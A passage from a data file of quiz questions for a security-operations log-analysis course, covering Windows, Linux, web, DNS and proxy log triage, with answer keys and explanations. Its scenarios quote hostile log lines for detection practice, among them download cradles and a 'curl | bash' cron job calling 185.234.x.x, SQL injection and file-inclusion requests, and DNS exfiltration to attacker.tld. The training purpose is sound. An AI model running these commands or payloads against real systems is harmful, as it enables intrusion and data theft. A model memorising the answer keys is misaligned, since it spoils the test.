          scenario: "Two systems log the same SSH login:\n  Firewall: 2026-06-15 08:14:22 +0000\n  Linux host: Jun 15 03:14:21 EST",
          question: "Why is this a problem for correlation, and what is the FIRST thing to fix?",
          options: [
            "There is no issue here because both systems are recording the event correctly, and the correlation engine automatically resolves time zone offsets.",
            "Adjust the SIEM correlation rules to accept a broad 6-hour window so that events with drifted timestamps will still match without issue.",
            "Discard the Linux authentication logs since they use a legacy, non-standardized timestamp format that cannot be parsed by modern SIEMs.",
            "Enforce a single time standard (UTC) and ISO 8601 on all sources, and ensure NTP synchronization is active across all log-producing systems."
          ],
          correctAnswer: 3,
          explanation: "Mixed time zones (UTC vs EST) and non-standard layouts break chronological ordering. Standardizing logs to UTC and ISO-8601 timestamps, combined with active NTP client synchronization, is the fundamental first step. Widening correlation windows (B) creates high false-positive rates."
        },
        {
          id: "la-q1-3",
          difficulty: "medium",
          tags: ["Log Levels", "Noise"],
          scenario: "Your app emits ~4M DEBUG lines/day. Storage cost is exploding and analysts ignore the index. The dev team insists DEBUG must stay 'for troubleshooting'.",
          question: "What is the right SOC-side action?",
          options: [
            "Drop DEBUG logs at the forwarder, send WARNING+ to the hot tier, and route verbose logs to cheap cold storage with a short retention window.",
            "Forward every log line to the hot SIEM tier regardless of severity, since storage licensing costs are cheap and visibility should be absolute.",
            "Disable application-level logging entirely on all production servers to eliminate storage costs and reduce the workload on the security team.",
            "Retain all DEBUG logs in the hot tier but mute all alerts associated with them to reduce the noise level in the analyst's triage queue."
          ],
          correctAnswer: 0,
          explanation: "Tiered log routing solves this conflict. We keep high-priority security events (WARNING, ERROR, auth/audit logs) on hot searchable storage, while shipping high-volume DEBUG logs to inexpensive object storage (e.g. S3) with a short lifecycle policy for developer use."
        },
        {
          id: "la-q1-4",
          difficulty: "medium",
          tags: ["Normalization", "CIM"],
          scenario: "Three sources log the same field different names:\n  Palo Alto: src\n  Cisco ASA: SourceIP\n  Windows: IpAddress",
          question: "What concept lets you write ONE detection that matches all three?",
          options: [
            "Log rotation — configuring the servers to periodically archive and compress old logs to prevent local disk space from filling up.",
            "CSV storage format — converting all firewall and operating system logs into comma-separated values for easier manual spreadsheet triage.",
            "Field normalization — mapping disparate vendor fields to a common schema (like Splunk CIM or Elastic ECS) such as src_ip during ingestion.",
            "Log transport encryption — implementing TLS protocols to encrypt logs in transit to prevent interception by unauthorized network sniffers."
          ],
          correctAnswer: 2,
          explanation: "Field normalization (under structures like Splunk's Common Information Model or Elastic Common Schema) standardizes field naming at index time. By mapping different source names to a common field like 'src_ip', a single rule can match events across all devices."
        },
        {
          id: "la-q1-5",
          difficulty: "medium",
          tags: ["Log Sources", "Coverage"],
          scenario: "Management asks: 'We have firewall logs — isn't that enough?' You map current coverage:\n  ✅ Perimeter firewall\n  ❌ Endpoint (no EDR/Sysmon)\n  ❌ Identity (no AD audit)\n  ❌ DNS\n  ❌ Cloud audit (AWS CloudTrail)",
          question: "Which gap most directly blinds you to a successful phishing → credential theft → lateral movement chain?",
          options: [
            "The perimeter firewall log coverage is fully sufficient on its own to detect and block the entire threat lifecycle at the network edge.",
            "Endpoint and identity logs, since the phishing execution occurs on the endpoint and credential abuse must be detected via AD auth events.",
            "Cloud audit logs, which would capture the initial delivery of the phishing email and track the malicious attachment's journey through mailboxes.",
            "DNS logs, since querying the malicious domain is the only detectable phase of a modern multi-stage credential harvesting campaign."
          ],
          correctAnswer: 1,
          explanation: "Firewalls only see network boundary traffic, missing internal behaviors. Endpoint logs capture payload execution, and identity logs (Active Directory logon events) capture credential theft. Both are crucial to visibility during post-compromise stages."
        },
        {
          id: "la-q1-6",
          difficulty: "easy",
          tags: ["Log Integrity", "Forensics"],
          scenario: "Mid-incident, a senior dev offers to 'clean up' a noisy production log file on the compromised host before forensics arrives.",
          question: "Correct response?",
          options: [
            "Refuse the request and preserve the file. Host logs are evidence; you must hash them, copy them to safe storage, and maintain a chain of custody.",
            "Approve the request since DEBUG logs are noise that do not contain security artifacts and cleanup helps speed up the system's performance.",
            "Manually delete the log file yourself immediately to prevent the attacker from tampering with it or using it to discover your defenses.",
            "Email the file to your personal address for analysis and then delete the original from the host to keep the directory clean for developers."
          ],
          correctAnswer: 0,
          explanation: "Modifying or cleaning files on a compromised server alters potential forensic evidence. Security standard practice mandates isolating the host, hashing files to verify integrity, copying logs to a secure central location, and strictly logging the chain of custody."
        },
        {
          id: "la-q1-7",
          difficulty: "medium",
          tags: ["Centralization", "Architecture"],
          question: "Why is shipping logs OFF the endpoint (to a central SIEM/syslog server) a security control, not just an operational one?",
          options: [
            "It formats the logs automatically into clean, standardized visual templates for easier dashboard creation and compliance auditing.",
            "It reduces the CPU utilization on the SIEM indexers by handling all the regex parsing and field extraction directly on the source host.",
            "It ensures compliance because central logs are required by HTTPS and TLS protocol specifications for secure communication.",
            "It prevents anti-forensics because local admins can delete local logs, but they cannot tamper with copies already sent to a central SIEM."
          ],
          correctAnswer: 3,
          explanation: "Centralization mitigates local log tampering. If an attacker gains administrative access on a host, they can execute commands like 'wevtutil cl' to erase trace files. However, logs shipped to a secure, write-once SIEM are preserved out of their reach."
        },
        {
          id: "la-q1-8",
          difficulty: "medium",
          tags: ["Retention", "Compliance"],
          scenario: "Your CISO asks 'what's the minimum log retention we need?' You have PCI-DSS scope (cardholder data) and a typical breach dwell time of 200+ days.",
          question: "Best answer?",
          options: [
            "A retention of 30 days is sufficient, as that matches the standard default configuration recommended by major firewall and EDR vendors.",
            "A short window of 7 days is best, as older data is rarely relevant for incident response and increases storage licensing costs.",
            "At least 1 year total with 3 months online, as PCI-DSS requires this minimum and breach dwell times often exceed several months.",
            "Indefinite retention of all logs on high-performance hot storage to ensure that every event is immediately searchable for forensic audits."
          ],
          correctAnswer: 2,
          explanation: "PCI-DSS requirement 10.5.1 mandates a minimum of 1 year retention, with the last 3 months immediately searchable. Given industry statistics showing breach detection times average over 200 days, short retention windows like 30 days would delete the evidence of the initial breach."
        },
        {
          id: "la-q1-9",
          difficulty: "hard",
          tags: ["Parsing", "Detection Quality"],
          scenario: "A new SaaS app sends logs as:\n  2026-06-15 08:14:22 LOGIN user=\"jdoe\" result=\"OK\" geo=\"IN-Bengaluru\" device=\"mac/Chrome\"\nThe SIEM ingests them as a single unparsed message field. The 'failed logins' dashboard shows ZERO events for this app despite obvious failures.",
          question: "Root cause and fix?",
          options: [
            "The SIEM system itself has crashed or has an internal database error, requiring you to open a priority support ticket with the vendor.",
            "The application is not generating any failed login events because all authentication attempts have been successful during this period.",
            "Failed-login dashboards do not support SaaS application logs natively, requiring you to purchase a specialized SaaS connector addon.",
            "The log is ingested as a raw string but not parsed; without extracting the result field, dashboards filtering on result=FAIL cannot match."
          ],
          correctAnswer: 3,
          explanation: "Without a parsing parser or ingest pipeline, the log entry is treated as a flat string blob. Structured dashboard filters that evaluate fields like 'result' will fail to match. The fix requires building a parser to tokenise the fields before dashboard queries run."
        },
        {
          id: "la-q1-10",
          difficulty: "hard",
          tags: ["Triage Mindset", "Pivoting"],
          scenario: "You see a single suspicious line in the proxy log: a workstation contacting hxxp://185.234.x.x/update.bin at 03:11 local. You have 10 minutes before standup.",
          question: "Which pivot order produces the most signal fastest?",
          options: [
            "Block the destination IP address at the perimeter firewall immediately, close the alert as remediated, and move to the next ticket.",
            "Pivot to DNS to find domain name resolution, EDR for process execution details, auth logs for active user sessions, and proxy logs for scope.",
            "Send an automated email to the user asking if they initiated any downloads at that time, and wait for their response before proceeding.",
            "Perform a hard reboot of the workstation immediately to terminate all network connections and flush out any active in-memory payloads."
          ],
          correctAnswer: 1,
          explanation: "Effective alert triage relies on contextual pivoting. Network logs identify DNS resolution, host EDR correlates network connections to the initiating process (e.g. wscript or certutil), and auth logs link the action to a user profile, establishing full context."
        },
    ]
  },
  {
    quizId: "la-q2",
    courseId: "log-analysis",
    title: "Windows Event Log Investigation",
    description: "Hands-on triage of Security, System, and Sysmon events — logon types, process creation, persistence, and lateral movement.",
    passingScore: 75,
    timeLimit: 25,
    questions: [
        {
          id: "la-q2-1",
          difficulty: "easy",
          tags: ["EID 4624", "Logon Types"],
          scenario: "Security log on FIN-WS-12:\n  EventID=4624  Account=jdoe  LogonType=3  SourceNetworkAddress=10.4.2.55  AuthPackage=NTLM  Time=02:47\nUser jdoe is in IT, normally logs in at 09:00 via interactive console.",
          question: "What is the most accurate interpretation?",
          options: [
            "Routine interactive console login (Type 2) by a user performing standard administrative tasks during normal working hours.",
            "A standard service account login (Type 5) triggered by a scheduled background process running locally on the workstation.",
            "Network logon (Type 3) over NTLM at 02:47 from a different subnet; check the source host and Kerberos tickets on the DC.",
            "A scheduled task logon (Type 4) executing a benign local diagnostic script configured by group policy preferences."
          ],
          correctAnswer: 2,
          explanation: "Logon Type 3 = network logon (SMB/WMI). NTLM at odd hours from an unusual source is a hallmark of lateral movement. Pivot to the source host's 4648 (explicit credentials) and the DC's 4769 (TGS) for Kerberoasting/PtH context."
        },
        {
          id: "la-q2-2",
          difficulty: "easy",
          tags: ["EID 4625", "Brute Force"],
          scenario: "Domain Controller security log shows in 90 seconds:\n  4625 Account=admin  SubStatus=0xC000006A  Source=203.0.113.77   ×42\n  4625 Account=root   SubStatus=0xC0000064  Source=203.0.113.77   ×31\n  4625 Account=test   SubStatus=0xC0000064  Source=203.0.113.77   ×28",
          question: "What attack pattern is this?",
          options: [
            "A single remote user mistyping their password multiple times while attempting to authenticate to their local workstation.",
            "Kerberoasting activity, characterized by a single workstation requesting service tickets for multiple Active Directory SPNs.",
            "Golden Ticket forgery, where an attacker has compromised the KRBTGT account and is generating custom tickets for domain access.",
            "Password spraying/brute force from a single source, as shown by mixed 0xC0000064 (unknown user) and 0xC000006A (bad password) codes."
          ],
          correctAnswer: 3,
          explanation: "0xC0000064 = unknown user (enumeration); 0xC000006A = bad password against a real user. High volume + multiple accounts + one source IP = brute force / spray. Containment: block source, alert IR, check for any 4624 success from the same IP."
        },
        {
          id: "la-q2-3",
          difficulty: "medium",
          tags: ["EID 4688", "Process Creation"],
          scenario: "EID 4688 on FIN-HR-04:\n  NewProcessName=C:\\Windows\\System32\\cmd.exe\n  ParentProcessName=C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE\n  CommandLine=cmd /c powershell -enc JABzAD0ATgBlAHcA...",
          question: "Triage call?",
          options: [
            "Malicious Office document execution (T1566.001); isolate the host, decode the PowerShell offline, and check for similar fleet execution.",
            "Benign document processing, where Microsoft Word legitimately spawns cmd.exe to launch system macros and local printer scripts.",
            "Low-priority alert, since system administrators frequently run encoded PowerShell commands for remote endpoint configuration.",
            "No action required, because Event ID 4688 has high false-positive rates and process creation logs are too noisy to trust."
          ],
          correctAnswer: 0,
          explanation: "WINWORD.EXE → cmd.exe → powershell -enc is one of the most reliable malicious patterns in Windows telemetry. Decode the base64 payload offline (don't execute) to confirm C2 / downloader behavior."
        },
        {
          id: "la-q2-4",
          difficulty: "medium",
          tags: ["Sysmon EID 1", "LOLBin"],
          scenario: "Sysmon Event ID 1:\n  Image=C:\\Windows\\System32\\certutil.exe\n  CommandLine=certutil -urlcache -split -f http://185.234.x.x/x.exe C:\\Users\\Public\\x.exe\n  ParentImage=C:\\Windows\\System32\\cmd.exe",
          question: "What is happening?",
          options: [
            "Routine certificate validation and maintenance, where the system checks local certificate trust chains and updates local CRLs.",
            "Standard Windows Update background task download, which uses certutil to fetch signature updates for Windows Defender.",
            "LOLBin abuse (T1105): certutil is used to download an external file; block the URL, isolate the host, and locate the binary.",
            "Enterprise PKI enrollment, where a local domain member machine auto-requests a new client authentication certificate from the CA."
          ],
          correctAnswer: 2,
          explanation: "certutil -urlcache -split -f <url> is a classic Living-Off-the-Land Binary download technique. Real PKI workflows never look like this. Hunt for the dropped binary's hash and any subsequent execution."
        },
        {
          id: "la-q2-5",
          difficulty: "medium",
          tags: ["EID 7045", "Persistence"],
          scenario: "System log on a Domain Controller:\n  EID=7045  ServiceName=AdobeUpdater_x86  ServiceFileName=cmd /c powershell -w hidden -c IEX(New-Object Net.WebClient).DownloadString('http://...')\n  AccountName=LocalSystem",
          question: "Verdict?",
          options: [
            "A legitimate Adobe Acrobat background update task configured to check for the latest product patches from the vendor website.",
            "A normal SCCM package installation workflow, which uses temporary local system services to push software updates to servers.",
            "A standard Group Policy software installation push running under local system privileges to deploy mandatory security tooling.",
            "Malicious service persistence (T1543.003), as Adobe never runs IEX from a URL under LocalSystem; stop the service and isolate the host."
          ],
          correctAnswer: 3,
          explanation: "EID 7045 with a PowerShell download-cradle as the service binary = classic persistence (T1543.003). Critical on a DC — escalate to IR immediately and check for similar entries on every host."
        },
        {
          id: "la-q2-6",
          difficulty: "medium",
          tags: ["EID 4672", "Privilege"],
          scenario: "EID 4672 (Special privileges assigned) fires on a workstation for the account 'helpdesk_temp' which is NOT in any admin group per AD.",
          question: "Most likely cause?",
          options: [
            "Token manipulation or unauthorized local admin assignment (T1134/T1078); check local admin groups and Event ID 4732 on the host.",
            "A standard informational logon event indicating the user has been granted their routine, pre-authorized administrative privileges.",
            "An automated Multi-Factor Authentication prompt, which assigns temporary high-privilege tokens while the user completes verification.",
            "A routine Group Policy refresh cycle, which temporarily maps system-level administrative privileges to process policy updates."
          ],
          correctAnswer: 0,
          explanation: "4672 means SeDebug / SeTakeOwnership / SeTcb etc. were granted at logon. If AD says non-admin but 4672 fires, the host has a local admin assignment or the token was elevated. Pair with 4732/4720 to find when it happened."
        },
        {
          id: "la-q2-7",
          difficulty: "medium",
          tags: ["EID 4720", "Account Creation"],
          scenario: "On a member server (not a DC) at 03:22:\n  4720 New account 'svc_backup2' created\n  4732 svc_backup2 added to local Administrators\n  4624 Type 10 (RDP) from 10.7.7.7 by svc_backup2  at 03:25",
          question: "What is this?",
          options: [
            "Standard sysadmin maintenance, where a local user account is created to support automated server backup tasks during scheduled hours.",
            "Adversary creating a local admin for persistence and remote RDP access; disable the account, terminate RDP, and isolate the server.",
            "A routine software installation workflow for a third-party backup agent that requires local administrative privileges to run services.",
            "An automated system behavior occurring when joining a member server to a new sub-domain, creating temporary recovery accounts."
          ],
          correctAnswer: 1,
          explanation: "Local-admin creation followed by immediate RDP from an internal IP is a textbook persistence + lateral movement pattern. Don't just disable — preserve evidence and find how 10.7.7.7 itself was compromised."
        },
        {
          id: "la-q2-8",
          difficulty: "hard",
          tags: ["Sysmon EID 3", "C2"],
          scenario: "Sysmon Event ID 3 (network connect):\n  Image=C:\\Users\\jdoe\\AppData\\Local\\Temp\\update.exe\n  DestinationIp=185.234.x.x  DestinationPort=443  Initiated=true\nFiring every 58–62 seconds for the last 6 hours.",
          question: "Best classification?",
          options: [
            "A normal web browser keepalive connection, which polls standard media servers at regular intervals to maintain active session states.",
            "A standard Windows operating system telemetry upload, which periodically sends system diagnostic details to Microsoft endpoints.",
            "Active command-and-control beaconing; locate the Temp directory binary, analyze the destination IP, and network-isolate the host.",
            "A scheduled security agent or antivirus engine update check, which queries signature definitions from a central server location."
          ],
          correctAnswer: 2,
          explanation: "Periodic outbound from a user-writable Temp directory to a non-corporate IP is a textbook beacon. Even on 443 (TLS) the timing pattern (jitter ±2s around 60s) is the giveaway. JA3 fingerprinting on the proxy confirms."
        },
        {
          id: "la-q2-9",
          difficulty: "hard",
          tags: ["EID 1102", "Anti-Forensics"],
          scenario: "Security log shows:\n  EID 1102 'The audit log was cleared'  SubjectUserName=Administrator  Time=04:01\nNo prior 4634 (logoff) for that admin session.",
          question: "Response?",
          options: [
            "Standard system maintenance, where a local administrator clears the event logs to free up system disk space during servicing.",
            "A temporary glitch where auditing is restarted, and you should re-enable event collection and resume normal monitoring operations.",
            "A scheduled server maintenance task that automatically reboots the system to apply software patches and reset security logs.",
            "An active intrusion indicator (anti-forensics T1070.001); retrieve logs from the central SIEM, trace the session, and start IR."
          ],
          correctAnswer: 3,
          explanation: "1102 by a non-routine account is one of the highest-fidelity 'adversary on the box' signals. The SIEM has the central copy — that's why we ship logs off-host. Pivot to the originating session (4624 Type 10 / Type 3) just before 04:01."
        },
        {
          id: "la-q2-10",
          difficulty: "hard",
          tags: ["Kerberos", "4769"],
          scenario: "On the DC:\n  Many 4769 (TGS request) events from workstation WKS-22 for service names like MSSQLSvc/db01.corp:1433, HTTP/sp01.corp, CIFS/file01.corp, all with TicketEncryptionType=0x17 (RC4-HMAC).",
          question: "What attack is most likely?",
          options: [
            "Routine service authentication, where a domain workstation legitimately requests multiple tickets for database and intranet access.",
            "Kerberoasting activity (T1558.003) using weak RC4 encryption; identify the source account, rotate credentials, and enforce AES.",
            "Golden Ticket abuse, where an attacker has forged domain tickets and is accessing arbitrary server services across the domain.",
            "Pass-the-Hash lateral movement, where the attacker uses NTLM hashes to authenticate directly to network resources without tickets."
          ],
          correctAnswer: 1,
          explanation: "RC4 (etype 0x17) TGS for many SPNs from one workstation is the Kerberoasting signature. Long-term fix: AES-only, group Managed Service Accounts, and long random passwords for SPN-bearing accounts."
        },
    ]
  },
  {
    quizId: "la-q3",
    courseId: "log-analysis",
    title: "Linux & Network Log Investigation",
    description: "Triage SSH, sudo, web, firewall, DNS, and proxy logs across realistic Linux/network scenarios.",
    passingScore: 75,
    timeLimit: 25,
    questions: [
        {
          id: "la-q3-1",
          difficulty: "easy",
          tags: ["auth.log", "SSH"],
          scenario: "/var/log/auth.log on web-edge-02:\n  Jun15 02:11 sshd[2231]: Failed password for invalid user oracle from 45.9.x.x port 51422 ssh2\n  Jun15 02:11 sshd[2232]: Failed password for invalid user postgres from 45.9.x.x port 51424 ssh2\n  Jun15 02:11 sshd[2233]: Failed password for invalid user admin from 45.9.x.x port 51426 ssh2\n  ... 800+ lines in 4 minutes ...",
          question: "What is this and what is the FIRST correct mitigation?",
          options: [
            "A minor misconfiguration in the network logging agent, causing duplicate authentication error reports to be sent.",
            "A large-scale DDoS attack targeting web services, requiring immediate coordination with your external internet provider.",
            "SSH brute-force and user enumeration from a single IP; block the IP at the perimeter, check for successful logons, and enforce key auth.",
            "A routine, pre-authorized vulnerability scan conducted by your internal penetration testing team during scheduled hours."
          ],
          correctAnswer: 2,
          explanation: "'invalid user' = the username doesn't exist (enumeration). Block at the edge (cheap) before tuning. Critically, grep the same IP for 'Accepted password' — any success means the brute force already worked."
        },
        {
          id: "la-q3-2",
          difficulty: "easy",
          tags: ["sudo", "Privilege Abuse"],
          scenario: "/var/log/auth.log:\n  Jun15 04:02 host01 sudo: jdoe : TTY=pts/1 ; PWD=/home/jdoe ; USER=root ; COMMAND=/bin/cat /etc/shadow",
          question: "Verdict?",
          options: [
            "A routine administrative task, as system administrators commonly view the shadow file to manually inspect user password ages.",
            "A standard automated backup operation that copies system configurations to secure offline database locations for recovery.",
            "A routine system patching process where administrative utility scripts query system files to verify configuration baselines.",
            "Privilege abuse or unauthorized credential access (T1003.008); check for subsequent file exfiltration and investigate immediately."
          ],
          correctAnswer: 3,
          explanation: "Reading /etc/shadow grabs hashed passwords for offline cracking. Even with sudo rights, no normal workflow needs this. Look for what jdoe did next (scp, base64, pastebin) and any new 'Accepted' SSH sessions after."
        },
        {
          id: "la-q3-3",
          difficulty: "medium",
          tags: ["Web Logs", "Web Attacks"],
          scenario: "Apache access.log:\n  198.51.100.4 - - [15/Jun/2026:08:14:22 +0000] \"GET /products?id=1%27%20OR%20%271%27=%271 HTTP/1.1\" 200 18422\n  198.51.100.4 - - [15/Jun/2026:08:14:23 +0000] \"GET /products?id=1%27%20UNION%20SELECT%20null,version()-- HTTP/1.1\" 200 19102\n  198.51.100.4 - - [15/Jun/2026:08:14:25 +0000] \"GET /products?id=1%27;%20SELECT%20*%20FROM%20users-- HTTP/1.1\" 200 27310",
          question: "What attack is in progress, and what does the 200 status code tell you?",
          options: [
            "SQL injection (T1190); 200 code indicates the application is responding without blocking, and increasing body sizes point to data extraction.",
            "Cross-Site Scripting (XSS), where a response code of 200 indicates that the WAF successfully blocked and logged the script payload.",
            "Path traversal attempt, where the attacker tries to read restricted server configurations, but the server successfully blocks access.",
            "Cross-Site Request Forgery (CSRF), where the web server processes unauthorized administrative requests because of missing session tokens."
          ],
          correctAnswer: 0,
          explanation: "URL-decoded payloads (' OR '1'='1, UNION SELECT, ;SELECT * FROM users) = classic SQLi. 200 + growing body size is a strong indicator the queries are succeeding and exfiltrating rows. Action: block IP, enable WAF rule, code review of /products."
        },
        {
          id: "la-q3-4",
          difficulty: "medium",
          tags: ["Firewall", "Port Scan"],
          scenario: "Firewall syslog:\n  10.6.1.77 → 10.6.1.10:22 SYN  denied\n  10.6.1.77 → 10.6.1.10:23 SYN  denied\n  10.6.1.77 → 10.6.1.10:80 SYN  denied\n  10.6.1.77 → 10.6.1.10:443 SYN  denied\n  10.6.1.77 → 10.6.1.10:445 SYN  denied\n  ... (sequential ports 1-65535 in 12s) ...",
          question: "What is this and what makes the source notable?",
          options: [
            "An external network port scan originating from the public internet, which can be safely ignored as it is blocked by default.",
            "A routine asset management discovery scan executed by the IT department to catalog active system services across subnets.",
            "An internal port scan (T1046) from a workstation; investigate the host immediately as it indicates potential post-compromise discovery.",
            "A high-volume automated backup operation transferring large database files between administrative servers on active ports."
          ],
          correctAnswer: 2,
          explanation: "Internal-to-internal scans are far more concerning than internet noise — they almost always mean a host is already compromised and the attacker is enumerating the segment. Confirm with asset-mgmt records before assuming malice, then isolate."
        },
        {
          id: "la-q3-5",
          difficulty: "medium",
          tags: ["DNS", "DNS Tunneling"],
          scenario: "DNS server query log for one client (5 min):\n  a1b2c3d4e5.exfil.attacker.tld TXT\n  f6g7h8i9j0.exfil.attacker.tld TXT\n  k1l2m3n4o5.exfil.attacker.tld TXT\n  ... 1,200 unique subdomains, all TXT, all to *.exfil.attacker.tld ...",
          question: "What is this pattern?",
          options: [
            "Normal Content Delivery Network (CDN) load-balancing traffic, which routinely queries dynamic domain records for routing.",
            "Standard DNSSEC cryptographic key validation and query patterns, where local recursive resolvers refresh zone signatures.",
            "A DNS amplification denial-of-service attack, where the attacker uses open resolvers to flood the target network with packets.",
            "DNS tunneling or data exfiltration (T1071.004/T1048.003); sinkhole the destination domain, and network-isolate the client immediately."
          ],
          correctAnswer: 3,
          explanation: "High entropy in subdomain labels + a single parent + TXT (large response capacity) is the canonical DNS-tunnel signature. Tools: dnscat2, iodine. Sinkhole the parent at the resolver; pivot to EDR for the process."
        },
        {
          id: "la-q3-6",
          difficulty: "medium",
          tags: ["Proxy", "C2 / Beaconing"],
          scenario: "Squid proxy log filtered for one client over 6 hours:\n  Every 60 ±3 seconds: GET http://185.234.x.x/api/poll  302  227 bytes  user-agent=curl/7.85.0",
          question: "Interpretation?",
          options: [
            "Active C2 beaconing indicated by periodic requests, raw destination IP, and atypical user-agent; isolate the client and block the IP.",
            "Normal web browser background polling, which queries administrative webmail servers at regular intervals to refresh user inbox states.",
            "An automated software updater client query, which contacts vendor endpoints to verify local system configuration package versions.",
            "A routine Network Time Protocol (NTP) sync request polling high-precision time servers to correct local workstation system clock drift."
          ],
          correctAnswer: 0,
          explanation: "Beacon traits present: regular interval with small jitter, suspicious destination (IP not domain), atypical UA (curl from a user host), tiny response body for control channel. Even on port 80/443 the timing exposes it."
        },
        {
          id: "la-q3-7",
          difficulty: "medium",
          tags: ["Web Logs", "LFI/RCE"],
          scenario: "Nginx access log:\n  GET /index.php?page=../../../../etc/passwd  200  3214\n  GET /index.php?page=php://filter/convert.base64-encode/resource=config  200  4011",
          question: "What two techniques are visible?",
          options: [
            "An attempt to perform directory listing on a restricted application directory, which returned a default server error response.",
            "Local File Inclusion (LFI) and PHP wrapper abuse (T1083/T1005) to read sensitive files and configurations; restrict open_basedir.",
            "A SQL injection (SQLi) attempt targeting database tables, which is handled and logged by database input validation libraries.",
            "A Server-Side Request Forgery (SSRF) attack attempting to force the backend web application to query internal server endpoints."
          ],
          correctAnswer: 1,
          explanation: "Classic LFI plus the php://filter wrapper to bypass PHP rendering and dump source/config. 200 on both = success. Any DB creds, API keys, or JWT secrets in the leaked config must be considered compromised."
        },
        {
          id: "la-q3-8",
          difficulty: "hard",
          tags: ["Linux", "Persistence"],
          scenario: "On a Linux web server, recent additions found by an audit:\n  /etc/cron.d/sysupd: */5 * * * * root curl -s http://185.234.x.x/s | bash\n  ~/.ssh/authorized_keys gained a new entry: ssh-rsa AAAA... attacker@op\n  /etc/systemd/system/upd.service runs /tmp/.x every boot",
          question: "Best summary?",
          options: [
            "A series of routine system updates deployed by the DevOps team to install standard utilities and update local user public keys.",
            "An automated backup script configuration that schedules administrative tasks and establishes system recovery processes for the host.",
            "Multiple persistence mechanisms (cron, SSH key, and service); assume full compromise, rebuild the host, and rotate all keys.",
            "A third-party systems monitoring agent installation that sets up background services to report hardware health details to the SOC."
          ],
          correctAnswer: 2,
          explanation: "Multiple independent persistence channels = the attacker assumed they'd be evicted and planted redundancy. Cleanup is not enough — rebuild. Don't forget any SSH keys this host trusted outbound, and any service tokens stored on it."
        },
        {
          id: "la-q3-9",
          difficulty: "hard",
          tags: ["Web Logs", "Recon"],
          scenario: "Web access log shows from a single IP:\n  GET /.git/config  404\n  GET /.env  200\n  GET /backup.zip  200\n  GET /admin/  401\n  GET /wp-login.php  404\n  GET /phpmyadmin/  404",
          question: "What is this and which response is the WORST news?",
          options: [
            "Harmless random scanner noise, as the majority of HTTP responses are non-200 errors and do not point to a successful compromise.",
            "An automated distributed denial-of-service (DDoS) attempt seeking to overwhelm the web application server with rapid requests.",
            "A search engine crawler checking for site search engine optimization rules and cataloging public links for index database updates.",
            "A content discovery scan where 200 codes confirm leak of sensitive files (/.env and /backup.zip); rotate all leaked credentials."
          ],
          correctAnswer: 3,
          explanation: ".env and backup archives in the web root are catastrophic exposures — they leak production secrets in plaintext. 200 means the attacker got them. Rotate every credential, key, and token in those files immediately and audit access logs for the same IP elsewhere."
        },
        {
          id: "la-q3-10",
          difficulty: "hard",
          tags: ["Correlation", "Multi-source"],
          scenario: "Same user, three logs, 30 seconds apart:\n  VPN: jdoe authenticated from 185.x.x.x (Country: RU)\n  Okta: jdoe MFA push approved (Country: RU)\n  Email: jdoe rule created — forward all mail to ext@attacker.tld + auto-delete",
          question: "Verdict and priority action?",
          options: [
            "Legitimate business travel by the employee, requiring you to mark the geographic logins as approved and close the alert ticket.",
            "Account takeover with mail forwarding (T1078/T1114.003); terminate all sessions, reset credentials/MFA, and delete the inbox rule.",
            "A simulated phishing test run by the internal security training team, which automatically flags rules and triggers alert testing.",
            "An instance of MFA fatigue where the user accidentally approved a prompt but did not suffer a successful compromise of their account."
          ],
          correctAnswer: 1,
          explanation: "Foreign auth followed within seconds by a hidden forwarding rule is the signature of business-email-compromise. Removing the rule is necessary but not sufficient — the attacker may have created OAuth app grants, inbox rules at the folder level, or alternate MFA devices."
        },
    ]
  },
  {
    quizId: "la-q4",
    courseId: "log-analysis",
    title: "Attack Pattern Recognition in Logs",
    description: "Identify multi-stage attack patterns — lateral movement, beaconing, exfiltration, ransomware staging — from log evidence.",
    passingScore: 80,
    timeLimit: 25,
    questions: [
        {
          id: "la-q4-1",
          difficulty: "medium",
          tags: ["Lateral Movement", "SMB"],
          scenario: "From host A (10.4.2.55) in 90 seconds:\n  10.4.2.55 → 10.4.2.10:445 SMB  Tree connect to ADMIN$\n  10.4.2.55 → 10.4.2.10:445 SMB  Write file: PSEXESVC.exe\n  10.4.2.10 EID 7045 ServiceName=PSEXESVC  ServiceFileName=%SystemRoot%\\PSEXESVC.exe\n  10.4.2.10 EID 4624 LogonType=3 Account=admin SourceNetworkAddress=10.4.2.55",
          question: "What technique is this and what is the right containment?",
          options: [
            "Routine fileshare connection where administrators execute standard system configurations or check directory properties.",
            "An automated system backup task configured to replicate server configurations and registry hives across administrative hosts.",
            "PsExec lateral movement (T1021.002/T1569.002); isolate hosts, stop the service, and hunt for credential compromise source.",
            "A normal Group Policy application pushing software packages and checking administrative privileges on remote endpoints."
          ],
          correctAnswer: 2,
          explanation: "ADMIN$ write of PSEXESVC + a matching 7045 + a 4624 Type 3 with admin creds = PsExec lateral movement. Critical question is HOW host A got admin creds (LSASS dump? Mimikatz? cached creds?) — that's the real start of the chain."
        },
        {
          id: "la-q4-2",
          difficulty: "medium",
          tags: ["Beaconing", "Timing Analysis"],
          scenario: "Proxy log for one workstation, plotted by minute:\n  Connections to a single external host arrive at 00, 60, 120, 180 ... seconds with ±3s jitter, 24h continuous, 24-byte payloads.",
          question: "Strongest single indicator that this is C2 beaconing rather than legitimate polling?",
          options: [
            "The connection utilizes HTTPS, which is atypical for standard corporate updates or developer API telemetry checks.",
            "The communication occurs over port 443, indicating that standard web traffic channels are being used to transport data.",
            "The source host is a macOS endpoint, which does not normally execute background system checks or diagnostic updates.",
            "Continuous 24h periodic connections with a fixed interval and tiny payloads, indicating lack of human-driven activity gaps."
          ],
          correctAnswer: 3,
          explanation: "Humans create natural gaps; software beacons don't. Continuous 24h periodicity with tiny payloads is the timing fingerprint of C2 (Cobalt Strike, Sliver, Empire). Pair with destination-reputation and JA3 for high confidence."
        },
        {
          id: "la-q4-3",
          difficulty: "medium",
          tags: ["Exfiltration", "DLP"],
          scenario: "Egress sensor:\n  Host 10.5.6.7 → drive.attacker.tld over 4h transferred 14 GB outbound\n  Same host shows 100MB/day average for the previous 30 days",
          question: "Best characterization?",
          options: [
            "Data exfiltration (T1048/T1567) to a new destination exceeding the baseline; isolate the host and evaluate data access scope.",
            "A legacy server backup task misconfiguration causing duplicate incremental database dumps to be pushed to an external server.",
            "A background operating system software update check transferring diagnostic logs and package files to vendor update endpoints.",
            "A normal cloud synchronization process triggered when a user uploads raw data archives to approved corporate storage bins."
          ],
          correctAnswer: 0,
          explanation: "Baselines are king. 140× normal egress + new external destination is a near-certain exfil. The follow-up question — 'what could that host reach?' — drives the breach scope and any required disclosures."
        },
        {
